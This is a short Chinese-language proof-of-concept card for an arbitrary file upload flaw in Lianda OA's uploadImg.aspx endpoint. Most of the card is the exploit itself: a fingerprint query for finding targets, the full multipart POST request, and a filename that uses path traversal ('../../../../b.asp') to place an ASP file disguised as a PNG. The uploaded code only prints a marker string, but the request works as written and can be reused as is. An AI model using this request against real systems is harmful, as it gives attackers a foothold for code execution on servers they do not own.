# 联达OA-uploadImg任意文件上传漏洞

- **系统**：联达OA-uploadImg　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="联达OA"`
- **请求**：`POST /Dept_Portal/uploadImg.aspx HTTP/1.1`
- **关键头**：`Host: your-ip`　`Content-Type: multipart/form-data; boundary=boundary=00content0boundary00`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="DesignId"
1
--00content0boundary00
Content-Disposition: form-data; name="Filedata"; filename="../../../../b.asp"
Content-Type: image/png
<% Response.Write("Hello, World") %>
--00content0boundary00--
上传定位：/b.asp
```
- **预期**：500　|　—